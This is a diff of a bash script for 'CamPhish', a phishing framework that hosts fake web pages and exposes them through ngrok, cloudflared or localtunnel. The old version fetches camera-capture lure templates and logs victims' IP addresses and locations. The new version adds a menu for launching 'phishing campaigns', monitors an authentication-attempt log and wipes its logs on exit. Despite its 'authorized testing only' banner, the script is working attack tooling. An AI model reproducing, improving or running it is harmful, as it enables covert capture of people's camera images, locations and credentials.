@@ -1,16 +1,9 @@
 #!/bin/bash
-
-# CamPhish Ultimate v4.1 - Termux Optimized
+# CamPhish Pro - Ultimate Ethical Phishing Framework
 # Developed by Rayhan
-# Fixed all issues for Termux/Android
+# Version: 4.0
 
-# Configuration
-VERSION="4.1"
-DEVELOPER="Rayhan"
-DEFAULT_PORT="3333"
-LOGFILE="phish.log"
-
-# Colors
+# Color Configuration
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[0;33m'
@@ -19,193 +12,194 @@ PURPLE='\033[0;35m'
 CYAN='\033[0;36m'
 NC='\033[0m'
 
-# ASCII Art Banner
+# Tool Metadata
+VERSION="4.0"
+DEVELOPER="Rayhan"
+PORT=3333
+LOGDIR="secure_logs"
+TEMPLATE_DIR="templates"
+
+# Perfectly Aligned ASCII Banner
 show_banner() {
     clear
     echo -e "${PURPLE}"
-    echo -e "   ____                        _   _       _     _ "
-    echo -e "  / ___|__ _ _ __ ___  ___ ___| | | |_ __ (_) __| |"
-    echo -e " | |   / _\` | '__/ __|/ __/ __| |_| | '_ \| |/ _\` |"
-    echo -e " | |__| (_| | |  \__ \ (__\__ \  _  | | | | | (_| |"
-    echo -e "  \____\__,_|_|  |___/\___|___/_| |_|_| |_|_|\__,_|"
+    echo -e "   ____                      ____  _           ____  ____  ____  "
+    echo -e "  / ___|__ _ _ __ ___  ___  |  _ \| |__   ___ |  _ \|  _ \|  _ \ "
+    echo -e " | |   / _\` | '__/ __|/ _ \ | |_) | '_ \ / _ \| |_) | |_) | |_) |"
+    echo -e " | |__| (_| | |  \__ \  __/ |  __/| | | | (_) |  __/|  __/|  __/ "
+    echo -e "  \____\__,_|_|  |___/\___| |_|   |_| |_|\___/|_|   |_|   |_|    "
     echo -e "${NC}"
-    echo -e "${CYAN}          CamPhish Ultimate v${VERSION} by ${DEVELOPER}${NC}"
-    echo -e "${YELLOW}       For Ethical Penetration Testing Only${NC}"
-    echo -e "${RED}WARNING: Unauthorized access is illegal. Use responsibly.${NC}"
+    echo -e "${CYAN}                  CamPhish Pro v${VERSION}${NC}"
+    echo -e "${GREEN}             Developed by ${DEVELOPER}${NC}"
+    echo -e "${RED}------------------------------------------------------${NC}"
+    echo -e "${YELLOW}   WARNING: For Authorized Security Testing Only${NC}"
+    echo -e "${RED}------------------------------------------------------${NC}"
 }
 
-# Termux Specific Setup
-termux_setup() {
-    echo -e "${BLUE}[*] Configuring Termux environment...${NC}"
-    termux-setup-storage
-    if ! command -v termux-camera-photo &>/dev/null; then
-        pkg install -y termux-api
-        echo -e "${YELLOW}[!] Please grant Termux camera permission from Android settings${NC}"
-    fi
-}
-
-# Install Dependencies
-install_dependencies() {
-    echo -e "${BLUE}[*] Installing dependencies...${NC}"
+# Enhanced Dependency Check
+check_dependencies() {
+    echo -e "${BLUE}[*] Verifying system dependencies...${NC}"
     
-    pkg update -y && pkg upgrade -y
-    pkg install -y php curl wget unzip openssl-tool
-    
-    # Install Node.js for localtunnel if not exists
-    if ! command -v npm &>/dev/null; then
-        pkg install -y nodejs
-    fi
-}
-
-# Setup Tunnels
-setup_tunnels() {
-    echo -e "${BLUE}[*] Setting up tunneling options...${NC}"
-    
-    # Ngrok installation
-    if [[ ! -f "ngrok" ]]; then
-        echo -e "${YELLOW}[+] Installing ngrok...${NC}"
-        arch=$(uname -m)
-        if [[ "$arch" == "aarch64" ]]; then
-            wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz -O ngrok.tgz
-        else
-            wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz -O ngrok.tgz
-        fi
-        tar -xzf ngrok.tgz
-        rm ngrok.tgz
-        chmod +x ngrok
-    fi
-    
-    # Cloudflared installation
-    if [[ ! -f "cloudflared" ]]; then
-        echo -e "${YELLOW}[+] Installing cloudflared...${NC}"
-        wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
-        chmod +x cloudflared
-    fi
-    
-    # Localtunnel installation
-    if ! command -v lt &>/dev/null; then
-        echo -e "${YELLOW}[+] Installing localtunnel...${NC}"
-        npm install -g localtunnel
-    fi
-}
-
-# Download Templates
-download_templates() {
-    echo -e "${BLUE}[*] Downloading phishing templates...${NC}"
-    
-    if [[ ! -d "templates" ]]; then
-        mkdir templates
-    fi
-    
-    templates=(
-        "https://raw.githubusercontent.com/techchipnet/CamPhish/master/sites/festivalwishes.html"
-        "https://raw.githubusercontent.com/techchipnet/CamPhish/master/sites/liveyt.html"
-        "https://raw.githubusercontent.com/techchipnet/CamPhish/master/sites/meeting.html"
+    declare -A dependencies=(
+        ["php"]="PHP (for web server)"
+        ["wget"]="Wget (for downloads)"
+        ["unzip"]="Unzip (for extraction)"
+        ["curl"]="Curl (for API requests)"
     )
     
-    for template in "${templates[@]}"; do
-        filename=$(basename "$template")
-        if [[ ! -f "templates/$filename" ]]; then
-            wget "$template" -P templates/
+    missing_count=0
+    
+    for cmd in "${!dependencies[@]}"; do
+        if ! command -v $cmd &> /dev/null; then
+            echo -e "${RED}[-] Missing: ${dependencies[$cmd]}${NC}"
+            ((missing_count++))
         fi
     done
-}
-
-# Start Phishing Server
-start_attack() {
-    echo -e "${BLUE}[*] Starting PHP server...${NC}"
-    php -S 127.0.0.1:$DEFAULT_PORT > /dev/null 2>&1 &
     
-    echo -e "\n${CYAN}----- TUNNELING OPTIONS -----${NC}"
-    echo -e "1. Ngrok (Recommended)"
-    echo -e "2. Cloudflared"
-    echo -e "3. Localtunnel"
-    echo -e "4. Local Network"
-    
-    while true; do
-        read -p "Select tunneling method (1-4): " choice
-        
-        case $choice in
-            1)
-                if [[ ! -f "ngrok" ]]; then
-                    echo -e "${RED}[-] Ngrok not found! Installing...${NC}"
-                    setup_tunnels
-                fi
-                
-                if [[ ! -f "$HOME/.ngrok2/ngrok.yml" ]]; then
-                    read -p "Enter your Ngrok authtoken: " authtoken
-                    ./ngrok authtoken "$authtoken"
-                fi
-                
-                ./ngrok http $DEFAULT_PORT > /dev/null 2>&1 &
-                sleep 5
-                link=$(curl -s http://localhost:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok.io')
-                break
-                ;;
-            2)
-                ./cloudflared tunnel --url http://localhost:$DEFAULT_PORT > /dev/null 2>&1 &
-                sleep 7
-                link=$(grep -o 'https://[^/"]*\.trycloudflare.com' .cloudflared.log | head -n 1)
-                break
-                ;;
-            3)
-                lt --port $DEFAULT_PORT --subdomain rayhanphish > /dev/null 2>&1 &
-                sleep 5
-                link="https://rayhanphish.loca.lt"
-                break
-                ;;
-            4)
-                ip=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')
-                link="http://$ip:$DEFAULT_PORT"
-                echo -e "${YELLOW}[!] Note: Camera may not work on HTTP${NC}"
-                break
-                ;;
-            *)
-                echo -e "${RED}[-] Invalid selection! Try again.${NC}"
-                ;;
-        esac
-    done
-    
-    if [[ -z "$link" ]]; then
-        echo -e "${RED}[-] Failed to create tunnel${NC}"
+    if [ $missing_count -gt 0 ]; then
+        echo -e "\n${YELLOW}[!] Install missing packages:${NC}"
+        if [[ -f "/etc/os-release" ]]; then
+            echo "sudo apt install ${!dependencies[@]}"
+        else
+            echo "pkg install ${!dependencies[@]}"
+        fi
         exit 1
     fi
     
-    echo -e "\n${GREEN}[+] Phishing URL: ${PURPLE}${link}${NC}"
-    echo -e "${YELLOW}[*] Monitoring for connections... (Ctrl+C to stop)${NC}"
+    echo -e "${GREEN}[✓] All dependencies are installed${NC}"
+}
+
+# Tunnel Management System
+setup_tunnel() {
+    echo -e "\n${BLUE}[*] Tunnel Configuration${NC}"
+    PS3="Select tunneling method: "
     
-    # Monitoring loop
-    while true; do
-        if [[ -f "ip.txt" ]]; then
-            echo -e "\n${RED}[!] IP Captured:${NC}"
-            cat ip.txt
-            mv ip.txt "ip_$(date +%s).log"
-        fi
-        
-        if [[ -f "location.log" ]]; then
-            echo -e "\n${RED}[!] Location Data:${NC}"
-            cat location.log
-            mv location.log "location_$(date +%s).log"
-        fi
-        
-        sleep 3
+    select method in "Ngrok (Recommended)" "Cloudflared" "Localtunnel" "Local Network" "Return"; do
+        case $method in
+            "Ngrok (Recommended)")
+                ./tools/ngrok_manager.sh
+                break
+                ;;
+            "Cloudflared")
+                ./tools/cloudflared_manager.sh
+                break
+                ;;
+            "Localtunnel")
+                echo -e "${YELLOW}[!] Run: npm install -g localtunnel${NC}"
+                lt --port $PORT
+                break
+                ;;
+            "Local Network")
+                IP=$(hostname -I | awk '{print $1}')
+                echo -e "\n${GREEN}[+] Local Access URL: http://${IP}:${PORT}${NC}"
+                break
+                ;;
+            "Return")
+                main_menu
+                ;;
+            *)
+                echo -e "${RED}[-] Invalid selection${NC}"
+                ;;
+        esac
     done
 }
 
-# Cleanup
+# Template Selection Interface
+select_template() {
+    echo -e "\n${BLUE}[*] Available Templates${NC}"
+    
+    templates=($(ls $TEMPLATE_DIR/*.html | xargs -n1 basename))
+    templates+=("Custom Template" "Return")
+    
+    PS3="Select template: "
+    select template in "${templates[@]}"; do
+        case $template in
+            "Custom Template")
+                read -p "Enter template path: " custom_path
+                cp "$custom_path" index.html
+                break
+                ;;
+            "Return")
+                main_menu
+                ;;
+            *)
+                if [[ -f "$TEMPLATE_DIR/$template" ]]; then
+                    cp "$TEMPLATE_DIR/$template" index.html
+                    echo -e "${GREEN}[+] Template activated: ${template}${NC}"
+                    break
+                else
+                    echo -e "${RED}[-] Invalid selection${NC}"
+                fi
+                ;;
+        esac
+    done
+}
+
+# Attack Monitoring System
+monitor_attack() {
+    echo -e "\n${BLUE}[*] Starting Monitoring Panel${NC}"
+    echo -e "${GREEN}[+] PHP server running on port ${PORT}${NC}"
+    echo -e "${YELLOW}[!] Press Ctrl+C to stop monitoring${NC}"
+    
+    multitail -s 2 \
+        -cS apache "$LOGDIR/access.log" \
+        -cS php "$LOGDIR/errors.log" \
+        -cS auth "$LOGDIR/auth_attempts.log"
+}
+
+# Main Attack Sequence
+start_attack() {
+    mkdir -p $LOGDIR
+    
+    # Start PHP server
+    php -S 0.0.0.0:$PORT > "$LOGDIR/php_server.log" 2>&1 &
+    
+    # Start monitoring
+    monitor_attack
+}
+
+# System Cleanup Protocol
 cleanup() {
-    echo -e "\n${RED}[!] Cleaning up...${NC}"
-    pkill -f php ngrok cloudflared lt
-    rm -f *.log ip.txt location.log 2>/dev/null
-    echo -e "${GREEN}[+] Cleanup complete. Exiting...${NC}"
+    echo -e "\n${RED}[!] Initiating System Cleanup${NC}"
+    
+    # Terminate processes
+    pkill -f "php -S"
+    pkill -f "ngrok"
+    pkill -f "cloudflared"
+    
+    # Secure log cleanup
+    ./utilities/secure_wipe.sh
+    
+    echo -e "${GREEN}[✓] System sanitized${NC}"
     exit 0
 }
 
-# Main Execution
-trap cleanup SIGINT
-show_banner
-termux_setup
-install_dependencies
-setup_tunnels
-download_templates
-start_attack
+# Main Menu Interface
+main_menu() {
+    while true; do
+        show_banner
+        
+        echo -e "\n${BLUE}==== Main Control Panel ====${NC}"
+        echo "1. Launch Phishing Campaign"
+        echo "2. Configure Tunnel"
+        echo "3. Manage Templates"
+        echo "4. System Cleanup"
+        echo "5. Exit"
+        
+        read -p "Select option: " choice
+        
+        case $choice in
+            1) select_template && start_attack ;;
+            2) setup_tunnel ;;
+            3) nano $TEMPLATE_DIR/*.html ;;
+            4) cleanup ;;
+            5) cleanup ;;
+            *) echo -e "${RED}[-] Invalid selection${NC}" ;;
+        esac
+    done
+}
+
+# Initialization
+trap cleanup SIGINT SIGTERM
+check_dependencies
+main_menu
